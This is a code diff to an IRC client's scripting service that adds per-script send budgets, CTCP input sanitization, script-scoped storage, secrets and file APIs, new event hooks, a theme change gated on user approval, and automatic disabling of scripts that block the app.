         conn?.ircService.sendMessage(chan, text.substring(0, 500));
       },
       sendCommand: (command: string, networkId?: string) => {
-        this.scriptSendCommand(command, networkId);
+        this.scriptSendCommand(command, networkId, script.id);
       },
 
       // --- Custom /command aliases (mIRC-style) ---
       registerCommand: (
         name: string,
         handler: (args: string[], ctx: ScriptCommandContext) => HookResult,
+        description?: string,
       ) => {
         if (typeof name !== 'string' || typeof handler !== 'function') return;
         const key = name.trim().toLowerCase().replace(/^\//, '');
         if (!key || /\s/.test(key)) return;
-        this.scriptCommands.set(key, { scriptId: script.id, handler });
+        this.scriptCommands.set(key, {
+          scriptId: script.id,
+          handler,
+          description:
+            typeof description === 'string' && description.trim()
+              ? description.trim().substring(0, 80)
+              : undefined,
+        });
       },
 
       // --- Context-menu items (mIRC-style popups) ---
@@ -1884,11 +2566,12 @@ class ScriptingService {
 
       // --- Action helpers (sugar over sendCommand) ---
       join: (channel: string, networkId?: string) =>
-        this.scriptSendCommand(`/join ${channel}`, networkId),
+        this.scriptSendCommand(`/join ${channel}`, networkId, script.id),
       part: (channel: string, reason?: string, networkId?: string) =>
         this.scriptSendCommand(
           `/part ${channel}${reason ? ' ' + reason : ''}`,
           networkId,
+          script.id,
         ),
       kick: (
         channel: string,
@@ -1899,19 +2582,44 @@ class ScriptingService {
         this.scriptSendCommand(
           `/kick ${channel} ${nick}${reason ? ' ' + reason : ''}`,
           networkId,
+          script.id,
         ),
       mode: (target: string, modes: string, networkId?: string) =>
-        this.scriptSendCommand(`/mode ${target} ${modes}`, networkId),
+        this.scriptSendCommand(
+          `/mode ${target} ${modes}`,
+          networkId,
+          script.id,
+        ),
       op: (channel: string, nick: string, networkId?: string) =>
-        this.scriptSendCommand(`/mode ${channel} +o ${nick}`, networkId),
+        this.scriptSendCommand(
+          `/mode ${channel} +o ${nick}`,
+          networkId,
+          script.id,
+        ),
       deop: (channel: string, nick: string, networkId?: string) =>
-        this.scriptSendCommand(`/mode ${channel} -o ${nick}`, networkId),
+        this.scriptSendCommand(
+          `/mode ${channel} -o ${nick}`,
+          networkId,
+          script.id,
+        ),
       voice: (channel: string, nick: string, networkId?: string) =>
-        this.scriptSendCommand(`/mode ${channel} +v ${nick}`, networkId),
+        this.scriptSendCommand(
+          `/mode ${channel} +v ${nick}`,
+          networkId,
+          script.id,
+        ),
       devoice: (channel: string, nick: string, networkId?: string) =>
-        this.scriptSendCommand(`/mode ${channel} -v ${nick}`, networkId),
+        this.scriptSendCommand(
+          `/mode ${channel} -v ${nick}`,
+          networkId,
+          script.id,
+        ),
       ban: (channel: string, mask: string, networkId?: string) =>
-        this.scriptSendCommand(`/mode ${channel} +b ${mask}`, networkId),
+        this.scriptSendCommand(
+          `/mode ${channel} +b ${mask}`,
+          networkId,
+          script.id,
+        ),
       /**
        * Build a ban mask for someone, the way the app's own ban dialog does.
        *
@@ -2037,22 +2745,36 @@ class ScriptingService {
       },
 
       unban: (channel: string, mask: string, networkId?: string) =>
-        this.scriptSendCommand(`/mode ${channel} -b ${mask}`, networkId),
+        this.scriptSendCommand(
+          `/mode ${channel} -b ${mask}`,
+          networkId,
+          script.id,
+        ),
       setTopic: (channel: string, topic: string, networkId?: string) =>
-        this.scriptSendCommand(`/topic ${channel} ${topic}`, networkId),
+        this.scriptSendCommand(
+          `/topic ${channel} ${topic}`,
+          networkId,
+          script.id,
+        ),
       changeNick: (newNick: string, networkId?: string) =>
-        this.scriptSendCommand(`/nick ${newNick}`, networkId),
+        this.scriptSendCommand(`/nick ${newNick}`, networkId, script.id),
       setAway: (reason?: string, networkId?: string) =>
-        this.scriptSendCommand(`/away${reason ? ' ' + reason : ''}`, networkId),
-      back: (networkId?: string) => this.scriptSendCommand('/away', networkId),
+        this.scriptSendCommand(
+          `/away${reason ? ' ' + reason : ''}`,
+          networkId,
+          script.id,
+        ),
+      back: (networkId?: string) =>
+        this.scriptSendCommand('/away', networkId, script.id),
       whois: (nick: string, networkId?: string) =>
-        this.scriptSendCommand(`/whois ${nick}`, networkId),
+        this.scriptSendCommand(`/whois ${nick}`, networkId, script.id),
       action: (target: string, text: string, networkId?: string) => {
         const net = this.validateNetworkId(networkId);
         if (!net || typeof text !== 'string') return;
         const tgt =
           this.sanitizeChannel(target) || this.sanitizeNick(target) || '';
         if (!tgt) return;
+        if (!this.spendSendBudget(script.id)) return;
         connectionManager
           .getConnection(net)
           ?.ircService.sendMessage(
@@ -2413,6 +3135,7 @@ class ScriptingService {
         if (!tgt || typeof text !== 'string' || text.length > 500) return;
         const net = this.validateNetworkId(networkId);
         if (!net) return;
+        if (!this.spendSendBudget(script.id)) return;
         const conn = connectionManager.getConnection(net);
         conn?.ircService.sendCommand(
           `NOTICE ${tgt} :${text.substring(0, 500)}`,
@@ -2428,8 +3151,27 @@ class ScriptingService {
         if (!tgt || typeof type !== 'string') return;
         const net = this.validateNetworkId(networkId);
         if (!net) return;
+        if (!this.spendSendBudget(script.id)) return;
         const conn = connectionManager.getConnection(net);
-        const ctcp = params ? `\x01${type} ${params}\x01` : `\x01${type}\x01`;
+        // Bounded here as well as by the outbound gate. A CTCP carries
+        // attacker-chosen bytes to an attacker-chosen nick, which makes it an
+        // exfiltration channel the web allowlist never sees. That cannot be
+        // closed without removing CTCP, but it can be held to one line, kept
+        // to a real CTCP verb, and counted against the same budget as
+        // everything else a script sends.
+        // The first token only. A CTCP verb is one word, so cutting at the
+        // first separator is faithful; stripping the separators instead would
+        // silently weld "VER SION QUIT" into one verb nobody wrote.
+        const safeType = String(type)
+          .trim()
+          .split(/[\s\r\n]+/)[0]
+          .replace(/[^A-Za-z0-9_-]/g, '')
+          .substring(0, 20);
+        if (!safeType) return;
+        const safeParams = String(params ?? '').substring(0, 400);
+        const ctcp = safeParams
+          ? `\x01${safeType} ${safeParams}\x01`
+          : `\x01${safeType}\x01`;
         conn?.ircService.sendMessage(tgt, ctcp);
       },
 
@@ -2525,6 +3267,208 @@ class ScriptingService {
           return [];
         }
       },
+
+      /**
+       * The Internal Address List - mIRC's $ial, and the reason a moderation
+       * script no longer has to WHOIS everybody to find out who it is talking
+       * to. Every call is a cache read; none of them sends IRC traffic.
+       */
+      users: {
+        get: (nick: string, networkId?: string) => {
+          const n = this.sanitizeNick(nick);
+          const net = this.validateNetworkId(networkId);
+          return n && net ? (addonIALService.get(net, n) ?? null) : null;
+        },
+
+        find: (
+          mask: string,
+          filters?: {
+            account?: string;
+            certfp?: string;
+            channel?: string;
+            away?: boolean;
+            limit?: number;
+          },
+        ) => {
+          const net = this.validateNetworkId(undefined);
+          if (!net || typeof mask !== 'string') return [];
+          return addonIALService.find(net, mask, filters ?? {});
+        },
+
+        onChannel: (channel: string, networkId?: string) => {
+          const chan = this.sanitizeChannel(channel);
+          const net = this.validateNetworkId(networkId);
+          return chan && net ? addonIALService.onChannel(net, chan) : [];
+        },
+
+        sharedChannels: (nick: string, networkId?: string) => {
+          const n = this.sanitizeNick(nick);
+          const net = this.validateNetworkId(networkId);
+          return n && net ? addonIALService.sharedChannels(net, n) : [];
+        },
+
+        matchesMask: (
+          user: { nick?: string; ident?: string; host?: string },
+          mask: string,
+        ) => !!user && typeof mask === 'string' && matchesHostmask(user, mask),
+      },
+
+      /**
+       * Cached channel state: topic metadata, modes and the ban/except/invite
+       * /quiet lists. `status` is `unknown` until the list has been fetched,
+       * which is not the same as the list being empty - a script that treats
+       * the two the same will unban nobody and think it succeeded.
+       */
+      channelState: {
+        get: (channel: string, networkId?: string) => {
+          const chan = this.sanitizeChannel(channel);
+          const net = this.validateNetworkId(networkId);
+          return chan && net
+            ? (addonChannelKnowledge.get(net, chan) ?? null)
+            : null;
+        },
+
+        getList: (channel: string, kind: MaskListKind, networkId?: string) => {
+          const chan = this.sanitizeChannel(channel);
+          const net = this.validateNetworkId(networkId);
+          if (!chan || !net || !MASK_LIST_KINDS.includes(kind))
+            return { kind, entries: [], status: 'unknown' as const };
+          return addonChannelKnowledge.getList(net, chan, kind);
+        },
+      },
+
+      /**
+       * What the server said about itself. `token` reaches any ISUPPORT value,
+       * including ones this app has never heard of, so a script on a new
+       * network does not have to wait for an app release.
+       */
+      server: {
+        get: (networkId?: string) => {
+          const net = this.validateNetworkId(networkId);
+          return net ? addonServerKnowledge.get(net) : null;
+        },
+
+        token: (name: string, networkId?: string) => {
+          const net = this.validateNetworkId(networkId);
+          return net && typeof name === 'string'
+            ? (addonServerKnowledge.token(net, name) ?? null)
+            : null;
+        },
+
+        hasCapability: (capability: string, networkId?: string) => {
+          const net = this.validateNetworkId(networkId);
+          return net && typeof capability === 'string'
+            ? addonServerKnowledge.hasCapability(net, capability)
+            : false;
+        },
+
+        isChannel: (target: string, networkId?: string) => {
+          const net = this.validateNetworkId(networkId);
+          return net && typeof target === 'string'
+            ? addonServerKnowledge.isChannel(net, target)
+            : false;
+        },
+      },
+
+      /**
+       * mIRC's hash tables, scoped to this script.
+       *
+       * Every table belongs to one script: guessing another script's table
+       * name gets you your own empty table, not their data. Writes report a
+       * quota reason instead of throwing, so a full store is something the
+       * script can handle rather than an exception from somewhere unrelated.
+       */
+      store: {
+        table: (name: string) => {
+          const table = typeof name === 'string' ? name.slice(0, 60) : '';
+          const id = script.id;
+          if (!table) throw new Error('Table name is required.');
+          return {
+            get: (key: string) => addonTableStore.get(id, table, key),
+            has: (key: string) => addonTableStore.has(id, table, key),
+            keys: () => addonTableStore.keys(id, table),
+            set: (key: string, value: TableValue, ttlMs?: number) =>
+              addonTableStore.set(id, table, key, value, ttlMs),
+            delete: (key: string) => addonTableStore.delete(id, table, key),
+            increment: (key: string, by?: number) =>
+              addonTableStore.increment(id, table, key, by),
+            compareAndSet: (
+              key: string,
+              expected: TableValue,
+              value: TableValue,
+            ) => addonTableStore.compareAndSet(id, table, key, expected, value),
+            batch: (operations: BatchOperation[]) =>
+              addonTableStore.batch(id, table, operations ?? []),
+            query: (options?: QueryOptions) =>
+              addonTableStore.query(id, table, options ?? {}),
+            drop: () => addonTableStore.dropTable(id, table),
+          };
+        },
+
+        tables: () => addonTableStore.tableNames(script.id),
+        usedBytes: () => addonTableStore.usedBytes(script.id),
+      },
+
+      /**
+       * Secrets, kept in the device Keychain and excluded from every backup
+       * and export. `keys` lists names only; there is no way to enumerate
+       * values, here or anywhere else.
+       */
+      secrets: {
+        set: (key: string, value: string) =>
+          addonSecretStore.set(script.id, key, value),
+        get: (key: string) => addonSecretStore.get(script.id, key),
+        has: (key: string) => addonSecretStore.has(script.id, key),
+        delete: (key: string) => addonSecretStore.delete(script.id, key),
+        keys: () => addonSecretStore.keys(script.id),
+      },
+
+      /**
+       * mIRC's $read and /write, inside a directory of your own.
+       *
+       * Paths are relative and traversal is refused: there is no way to name a
+       * file outside your workspace, and no API here takes an absolute path.
+       * Writes are atomic, so an interrupted one leaves the previous file.
+       */
+      files: {
+        read: (path: string) => addonWorkspace.readText(script.id, path),
+        write: (path: string, contents: string) =>
+          addonWorkspace.writeText(script.id, path, contents),
+        remove: (path: string) => addonWorkspace.remove(script.id, path),
+        rename: (from: string, to: string) =>
+          addonWorkspace.rename(script.id, from, to),
+        list: (directory?: string) =>
+          addonWorkspace.list(script.id, directory ?? ''),
+        stat: (path: string) => addonWorkspace.stat(script.id, path),
+        usedBytes: () => addonWorkspace.usedBytes(script.id),
+      },
+
+      /**
+       * Parsers for the file shapes scripts actually meet. Every one is total:
+       * malformed input gives a value, never a throw, because a file a user
+       * edited by hand should cost you a line rather than the whole script.
+       */
+      parse: {
+        lines: (text: string) => parseLines(text),
+        json: (text: string) => parseJson(text),
+        csv: (text: string) => parseCsv(text),
+        ini: (text: string) => parseIni(text),
+      },
+
+      format: {
+        lines: (lines: string[]) => formatLines(lines ?? []),
+        csv: (rows: string[][]) => formatCsv(rows ?? []),
+        ini: (data: Record<string, Record<string, string>>) =>
+          formatIni(data ?? {}),
+      },
+
+      /**
+       * mIRC's /signal, between scripts on this device. Delivered locally and
+       * synchronously; a broadcast never comes back to its sender, and a chain
+       * that keeps answering itself is stopped rather than followed.
+       */
+      signal: (name: string, payload?: unknown, target?: string) =>
+        this.dispatchSignal(script.id, name, payload ?? null, target),
 
       getChannelInfo: (channel: string, networkId?: string) => {
         const chan = this.sanitizeChannel(channel);
@@ -2883,6 +3827,56 @@ class ScriptingService {
         }
       },
 
+      /** Resolve a semantic theme colour without hardcoding a palette. */
+      themeColour: (role: string): string | null => {
+        if (typeof role !== 'string') return null;
+        try {
+          const colors = themeService.getColors() as unknown as Record<
+            string,
+            string
+          >;
+          const color = colors[role.trim()];
+          return typeof color === 'string' ? color : null;
+        } catch {
+          return null;
+        }
+      },
+
+      /** Change theme only after the user explicitly approves the request. */
+      setTheme: async (name: string): Promise<boolean> => {
+        if (typeof name !== 'string' || !name.trim()) return false;
+        const requested = name.trim();
+        const theme = themeService
+          .getAvailableThemes()
+          .find(
+            item =>
+              item.id.toLowerCase() === requested.toLowerCase() ||
+              item.name.toLowerCase() === requested.toLowerCase(),
+          );
+        if (!theme) return false;
+        const approved = await new Promise<boolean>(resolve => {
+          Alert.alert(
+            t('Change theme?'),
+            t('Script "{name}" wants to change the theme to {theme}.', {
+              name: script.name,
+              theme: theme.name,
+            }),
+            [
+              {
+                text: t('Cancel'),
+                style: 'cancel',
+                onPress: () => resolve(false),
+              },
+              { text: t('Change'), onPress: () => resolve(true) },
+            ],
+            { cancelable: true, onDismiss: () => resolve(false) },
+          );
+        });
+        if (!approved) return false;
+        await themeService.setTheme(theme.id);
+        return true;
+      },
+
       // Connection stats
       /** True when you are marked away on any network. */
       isAnyAway: (): boolean => {
@@ -3206,10 +4200,43 @@ class ScriptingService {
   }
 
   handleConnect(networkId: string) {
+    this.emitAddonEvent(
+      createAddonEventEnvelope({
+        id: this.nextAddonEventId('connect'),
+        type: 'irc.connect',
+        network: networkId,
+      }),
+    );
     this.runHook('onConnect', h => h.onConnect?.(networkId));
   }
 
   handleMessage(message: IRCMessage) {
+    const connection = message.network
+      ? connectionManager.getConnection(message.network)
+      : connectionManager.getActiveConnection();
+    const senderIsOp =
+      !!message.channel &&
+      !!message.from &&
+      connection?.ircService
+        .getChannelUsers(message.channel)
+        .some(
+          user =>
+            user.nick.toLocaleLowerCase('en-US') ===
+              message.from!.toLocaleLowerCase('en-US') &&
+            user.modes?.some(
+              mode => mode === 'o' || mode === 'a' || mode === 'q',
+            ) === true,
+        );
+    const addonRoute = this.emitAddonEvent(
+      addonEventFromIrcMessage(message, {
+        selfNick: connection?.ircService.getCurrentNick(),
+        serverOrigin:
+          message.rawCategory === 'server' ||
+          message.command === 'ERROR' ||
+          message.command === 'WALLOPS',
+        senderIsOp,
+      }),
+    );
     // Handle regular messages
     if (message.type === 'message') {
       this.runHook('onMessage', h => h.onMessage?.(message));
@@ -3218,6 +4245,15 @@ class ScriptingService {
       }
     } else if (message.type === 'notice') {
       this.runHook('onNotice', h => h.onNotice?.(message));
+      if (message.command === 'WALLOPS') {
+        this.runHook('onWallops', h =>
+          h.onWallops?.(message.from || '', message.text, message),
+        );
+      } else if (message.isRaw && message.rawCategory === 'server') {
+        this.runHook('onServerNotice', h =>
+          h.onServerNotice?.(message.from || '', message.text, message),
+        );
+      }
     } else if (message.type === 'join' && message.channel && message.from) {
       this.runHook('onJoin', h =>
         h.onJoin?.(message.channel!, message.from!, message),
@@ -3236,14 +4272,39 @@ class ScriptingService {
       this.runHook('onNickChange', h =>
         h.onNickChange?.(oldNick, newNick, message),
       );
-    } else if (message.type === 'mode' && message.channel && message.from) {
-      // Parse mode change: +o nick or -v nick, etc.
-      const modeText = message.text || '';
-      const parts = modeText.split(' ');
-      const mode = parts[0] || '';
-      const target = parts[1] || undefined;
+    } else if (message.command === 'MODE') {
+      const modeLine = message.mode || '';
+      const modeTarget = message.channel || message.target || '';
+      const setter = message.from || '';
       this.runHook('onMode', h =>
-        h.onMode?.(message.channel!, message.from!, mode, target, message),
+        h.onMode?.(
+          modeTarget,
+          setter,
+          modeLine.split(/\s+/)[0] || '',
+          modeLine.split(/\s+/)[1],
+          message,
+        ),
+      );
+      if (message.channel) {
+        this.dispatchSpecializedModes(
+          message.channel,
+          setter,
+          modeLine,
+          message,
+        );
+        if (!setter || setter.includes('.')) {
+          this.runHook('onServerMode', h =>
+            h.onServerMode?.(modeTarget, setter, modeLine, message),
+          );
+        }
+      } else {
+        this.runHook('onUserMode', h =>
+          h.onUserMode?.(modeTarget, setter, modeLine, message),
+        );
+      }
+    } else if (message.type === 'error' || message.command === 'ERROR') {
+      this.runHook('onServerError', h =>
+        h.onServerError?.(message.text, message),
       );
     } else if (message.type === 'topic' && message.channel) {
       const topic = message.text || '';
@@ -3295,9 +4356,18 @@ class ScriptingService {
         );
       }
     }
+    return addonRoute;
   }
 
   handleDisconnect(networkId: string, reason?: string) {
+    this.emitAddonEvent(
+      createAddonEventEnvelope({
+        id: this.nextAddonEventId('disconnect'),
+        type: 'irc.disconnect',
+        network: networkId,
+        payload: { reason: reason ?? '' },
+      }),
+    );
     this.runHook('onDisconnect', h => h.onDisconnect?.(networkId, reason));
     // Clear all timers for this network
     this.timers.forEach((timer, timerId) => {
@@ -3306,6 +4376,96 @@ class ScriptingService {
         this.timers.delete(timerId);
       }
     });
+  }
+
+  handleAppStateChange(state: AddonAppState): void {
+    this.emitAddonEvent(
+      createAddonEventEnvelope({
+        id: this.nextAddonEventId('app-state'),
+        type: 'app.state-change',
+        payload: { state },
+      }),
+    );
+    this.runHook('onAppStateChange', hooks => hooks.onAppStateChange?.(state));
+  }
+
+  private runSingleLifecycleHook(
+    script: CompiledScript,
+    hook: 'onLoad' | 'onStart',
+  ): void {
+    try {
+      script.hooks?.[hook]?.();
+    } catch (error) {
+      const message = `${hook} failed: ${String(error)}`;
+      logger.error('scripting', message);
+      this.addLog({ level: 'error', message, scriptId: script.id });
+    }
+  }
+
+  subscribeAddonEvents(
+    listener: (event: Readonly<AddonEventEnvelope>) => void,
+  ): () => void {
+    this.addonEventListeners.add(listener);
+    return () => this.addonEventListeners.delete(listener);
+  }
+
+  /** Safely previews one imported addon's display response in the editor. */
+  previewAddonDisplay(addonId: string): Promise<AddonEventPreviewResult> {
+    return addonEventRouter.preview(
+      addonId,
+      createAddonEventEnvelope({
+        id: this.nextAddonEventId('preview'),
+        type: 'irc.message',
+        network: 'preview-network',
+        target: '#preview',
+        channel: '#preview',
+        sender: {
+          nick: 'PreviewUser',
+          ident: 'preview',
+          host: 'preview.invalid',
+        },
+        payload: {
+          text: 'AndroidIRCX addon display preview',
+          command: 'PRIVMSG',
+          senderIsOp: false,
+          preview: true,
+        },
+      }),
+    );
+  }
+
+  private emitAddonEvent(
+    event: Readonly<AddonEventEnvelope>,
+  ): Promise<AddonEventRouteResult> {
+    const route = addonEventRouter.route(event).catch(error => {
+      logger.warn(
+        'scripting',
+        `Imported addon event routing failed: ${String(error)}`,
+      );
+      return {
+        delivered: 0,
+        failed: 1,
+        stoppedBy: undefined,
+        hideDefaultRequestedBy: [],
+        transformations: [],
+      };
+    });
+    this.addonEventListeners.forEach(listener => {
+      try {
+        listener(event);
+      } catch (error) {
+        logger.warn(
+          'scripting',
+          `Normalized addon event listener failed: ${String(error)}`,
+        );
+      }
+    });
+    return route;
+  }
+
+  private nextAddonEventId(prefix: string): string {
+    this.addonEventSequence += 1;
+    return `${prefix}-${Date.now()}-${this.addonEventSequence}`;
   }
 
   /**
@@ -3323,8 +4483,124 @@ class ScriptingService {
    */
   handleRaw(line: string, direction: 'in' | 'out', message?: IRCMessage): void {
     if (!line) return;
+    const pingPong = this.parseObservedPingPong(line);
+    if (pingPong?.command === 'PING') {
+      this.runHook('onPing', h => h.onPing?.(pingPong.token, direction));
+    } else if (pingPong?.command === 'PONG') {
+      this.runHook('onPong', h => h.onPong?.(pingPong.token, direction));
+    }
     this.runHook('onRaw', h => {
       h.onRaw?.(line, direction, message);
+    });
+  }
+
+  /**
+   * Dispatch a parsed numeric. Returning false suppresses only the default UI
+   * line; IRCService still processes the numeric and updates protocol state.
+   */
+  handleNumeric(
+    code: number,
+    params: string[],
+    text: string,
+    message: IRCMessage,
+  ): boolean {
+    this.dispatchPresenceNumeric(code, params, message);
+    if (!adRewardService.hasAvailableTime()) {
+      this.updateUsageTracking();
+      return true;
+    }
+
+    let displayDefault = true;
+    this.scripts.forEach(script => {
+      if (!script.enabled || !script.hooks?.onNumeric) return;
+      try {
+        if (
+          script.hooks.onNumeric(code, [...params], text, message) === false
+        ) {
+          displayDefault = false;
+        }
+      } catch (error) {
+        const msg = t('Error in script {name} hook {hook}: {error}', {
+          name: script.name,
+          hook: 'onNumeric',
+          error: String(error),
+        });
+        logger.error('scripting', msg);
+        this.addLog({ level: 'error', message: msg, scriptId: script.id });
+      }
+    });
+    return displayDefault;
+  }
+
+  private dispatchSpecializedModes(
+    channel: string,
+    setter: string,
+    modeLine: string,
+    message: IRCMessage,
+  ): void {
+    const names: Record<string, [keyof ScriptHooks, keyof ScriptHooks]> = {
+      b: ['onBan', 'onUnban'],
+      o: ['onOp', 'onDeop'],
+      v: ['onVoice', 'onDevoice'],
+      h: ['onHelp', 'onDehelp'],
+    };
+    parseAddonModeChanges(modeLine).forEach(change => {
+      const pair = names[change.mode];
+      if (!pair || !change.parameter) return;
+      const hook = change.adding ? pair[0] : pair[1];
+      this.runHook(hook, hooks => {
+        const handler = hooks[hook] as ModeTargetHook | undefined;
+        handler?.(channel, setter, change.parameter!, message);
+      });
+    });
+  }
+
+  private parseObservedPingPong(
+    line: string,
+  ): { command: 'PING' | 'PONG'; token: string } | null {
+    const match = line.match(
+      /^(?:@\S+\s+)?(?::\S+\s+)?(PING|PONG)(?:\s+:?([^\r\n]*))?$/i,
+    );
+    if (!match) return null;
+    return {
+      command: match[1].toUpperCase() as 'PING' | 'PONG',
+      token: (match[2] || '').trim(),
+    };
+  }
+
+  private dispatchPresenceNumeric(
+    code: number,
+    params: string[],
+    message: IRCMessage,
+  ): void {
+    const hook = [600, 604, 730].includes(code)
+      ? 'onNotifyOnline'
+      : [601, 605, 731].includes(code)
+        ? 'onNotifyOffline'
+        : null;
+    if (!hook) return;
+
+    const entries =
+      code === 730 || code === 731
+        ? params
+            .join(' ')
+            .replace(/^:/, '')
+            .split(',')
+            .map(value => value.trim())
+            .filter(Boolean)
+        : [params[0] || ''];
+    entries.forEach(entry => {
+      const match = entry.match(/^([^!\s]+)(?:!([^@\s]+)@(.+))?$/);
+      if (!match) return;
+      this.runHook(hook, hooks => {
+        const handler = hooks[hook] as PresenceHook | undefined;
+        handler?.(
+          match[1],
+          match[2] || params[1] || '',
+          match[3] || params[2] || '',
+          message,
+        );
+      });
     });
   }
 
@@ -3436,6 +4712,66 @@ class ScriptingService {
     return current || null;
   }
 
+  processComposerInput(
+    text: string,
+    context: ScriptInputContext,
+  ): string | null {
+    if (typeof text !== 'string' || text.length > 4000) return null;
+    let current = text;
+    this.runHook('onInput', hooks => {
+      const result = hooks.onInput?.(current, { ...context });
+      if (typeof result === 'string') current = result.slice(0, 4000);
+      else if (result && typeof result === 'object') {
+        if (result.cancel) current = '';
+        else if (result.command) current = result.command.slice(0, 4000);
+      }
+    });
+    return current.trim() ? current : null;
+  }
+
+  getTabCompletions(
+    text: string,
+    cursor: number,
+    context: ScriptInputContext,
+  ): ScriptCompletion[] {
+    if (
+      typeof text !== 'string' ||
+      text.length > 4000 ||
+      !Number.isInteger(cursor) ||
+      cursor < 0 ||
+      cursor > text.length
+    ) {
+      return [];
+    }
+    const results: ScriptCompletion[] = [];
+    this.runHook('onTabComplete', hooks => {
+      if (results.length >= 8) return;
+      const value = hooks.onTabComplete?.(text, cursor, { ...context });
+      const candidates = Array.isArray(value) ? value : value ? [value] : [];
+      candidates.forEach(candidate => {
+        if (results.length >= 8) return;
+        const normalized =
+          typeof candidate === 'string' ? { text: candidate } : candidate;
+        if (
+          !normalized ||
+          typeof normalized.text !== 'string' ||
+          !normalized.text.trim() ||
+          normalized.text.length > 400
+        ) {
+          return;
+        }
+        const description =
+          typeof normalized.description === 'string'
+            ? normalized.description.slice(0, 200)
+            : undefined;
+        if (!results.some(item => item.text === normalized.text)) {
+          results.push({ text: normalized.text, description });
+        }
+      });
+    });
+    return results;
+  }
+
   private updateUsageTracking() {
     const hasEnabledScripts = this.scripts.some(s => s.enabled);
 
@@ -3472,6 +4808,7 @@ class ScriptingService {
 
     this.scripts.forEach(script => {
       if (!script.enabled || !script.hooks) return;
+      const startedAt = Date.now();
       try {
         runner(script.hooks);
       } catch (error) {
@@ -3482,8 +4819,61 @@ class ScriptingService {
         });
         logger.error('scripting', msg);
         this.addLog({ level: 'error', message: msg, scriptId: script.id });
+        addonDiagnostics.recordError(script.id, String(hook), error);
       }
+      const elapsed = Date.now() - startedAt;
+      addonDiagnostics.count(script.id, 'events');
+      addonDiagnostics.recordExecution(script.id, elapsed);
+      if (elapsed >= SLOW_HOOK_MS) this.noteSlowHook(script, hook, elapsed);
     });
+  }
+
+  /**
+   * A script that blocks the app for seconds at a time, repeatedly.
+   *
+   * These hooks run synchronously on the app's own JS thread, and a `while
+   * (true)` inside one **cannot be interrupted** — there is no pre-emption to
+   * reach for. Imported addon packages get a real deadline because they run in
+   * a separate QuickJS context; legacy scripts do not, and pretending otherwise
+   * would be worse than saying so.
+   *
+   * What is achievable is making it non-recurring: after three slow runs the
+   * script is disabled, so the freeze is something that happened once rather
+   * than every time the app starts. That is the difference between an annoyance
+   * and a phone the user cannot use until they reinstall.
+   */
+  private noteSlowHook(
+    script: CompiledScript,
+    hook: keyof ScriptHooks,
+    elapsed: number,
+  ): void {
+    const count = (this.slowHookCounts.get(script.id) ?? 0) + 1;
+    this.slowHookCounts.set(script.id, count);
+    addonDiagnostics.count(script.id, 'timeouts');
+
+    this.addLog({
+      level: 'warn',
+      message: t('Script {name} blocked the app for {ms}ms in {hook}.', {
+        name: script.name,
+        ms: String(elapsed),
+        hook: String(hook),
+      }),
+      scriptId: script.id,
+    });
+
+    if (count < SLOW_HOOK_LIMIT) return;
+    this.slowHookCounts.delete(script.id);
+    script.enabled = false;
+    this.clearScriptRegistrations(script.id);
+    this.addLog({
+      level: 'error',
+      message: t(
+        'Script {name} was disabled after blocking the app {count} times.',
+        { name: script.name, count: String(SLOW_HOOK_LIMIT) },
+      ),
+      scriptId: script.id,
+    });
+    this.save().catch(() => {});
   }
 
   testHook(scriptId: string, hook: keyof ScriptHooks) {
@@ -3535,6 +4925,40 @@ class ScriptingService {
         case 'onMode':
           script.hooks.onMode?.('#test', 'op', '+o', 'user', sampleMsg);
           break;
+        case 'onBan':
+        case 'onUnban':
+        case 'onOp':
+        case 'onDeop':
+        case 'onVoice':
+        case 'onDevoice':
+        case 'onHelp':
+        case 'onDehelp':
+          (script.hooks[hook] as ModeTargetHook | undefined)?.(
+            '#test',
+            'op',
+            hook === 'onBan' || hook === 'onUnban' ? '*!*@example' : 'user',
+            sampleMsg,
+          );
+          break;
+        case 'onUserMode':
+        case 'onServerMode':
+          script.hooks[hook]?.('tester', 'server.example', '+i', sampleMsg);
+          break;
+        case 'onServerNotice':
+        case 'onWallops':
+          script.hooks[hook]?.('server.example', 'Test notice', sampleMsg);
+          break;
+        case 'onServerError':
+          script.hooks.onServerError?.('Test server error', sampleMsg);
+          break;
+        case 'onPing':
+        case 'onPong':
+          script.hooks[hook]?.('test-token', 'in');
+          break;
+        case 'onNotifyOnline':
+        case 'onNotifyOffline':
+          script.hooks[hook]?.('tester', 'user', 'host.example', sampleMsg);
+          break;
         case 'onTopic':
           script.hooks.onTopic?.('#test', 'New topic', 'setter', sampleMsg);
           break;
@@ -3547,10 +4971,83 @@ class ScriptingService {
         case 'onRaw':
           script.hooks.onRaw?.('PRIVMSG #test :hello', 'in', sampleMsg);
           break;
+        case 'onNumeric':
+          script.hooks.onNumeric?.(
+            372,
+            ['sampleNet', 'MOTD line'],
+            'MOTD line',
+            { ...sampleMsg, type: 'raw', numeric: '372' },
+          );
+          break;
+        case 'onTabOpen':
+        case 'onTabClose':
+          script.hooks[hook]?.({
+            id: 'sampleNet::#test',
+            name: '#test',
+            type: 'channel',
+            networkId: 'sampleNet',
+            messages: [],
+          });
+          break;
+        case 'onTabActivate': {
+          const sampleTab: ChannelTab = {
+            id: 'sampleNet::#test',
+            name: '#test',
+            type: 'channel',
+            networkId: 'sampleNet',
+            messages: [],
+          };
+          script.hooks.onTabActivate?.(undefined, sampleTab);
+          break;
+        }
+        case 'onFileSent':
+        case 'onFileReceived':
+        case 'onDccSendFailed':
+        case 'onDccReceiveFailed':
+          script.hooks[hook]?.({
+            id: 'sample-transfer',
+            networkId: 'sampleNet',
+            peerNick: 'tester',
+            offer: {
+              filename: 'sample.txt',
+              host: '127.0.0.1',
+              port: 5000,
+            },
+            status: hook.includes('Failed') ? 'failed' : 'completed',
+            error: hook.includes('Failed') ? 'Test failure' : undefined,
+            bytesReceived: 10,
+            size: 10,
+            direction:
+              hook === 'onFileSent' || hook === 'onDccSendFailed'
+                ? 'outgoing'
+                : 'incoming',
+          });
+          break;
+        case 'onAppStateChange':
+          script.hooks.onAppStateChange?.('active');
+          break;
+        case 'onLoad':
+        case 'onStart':
+          script.hooks[hook]?.();
+          break;
         case 'onCommand':
           script.hooks.onCommand?.('/echo hi', {
             channel: '#test',
             networkId: 'sampleNet',
+          });
+          break;
+        case 'onInput':
+          script.hooks.onInput?.('hello', {
+            channel: '#test',
+            networkId: 'sampleNet',
+            tabType: 'channel',
+          });
+          break;
+        case 'onTabComplete':
+          script.hooks.onTabComplete?.('/he', 3, {
+            channel: '#test',
+            networkId: 'sampleNet',
+            tabType: 'channel',
           });
           break;
         case 'onTimer':
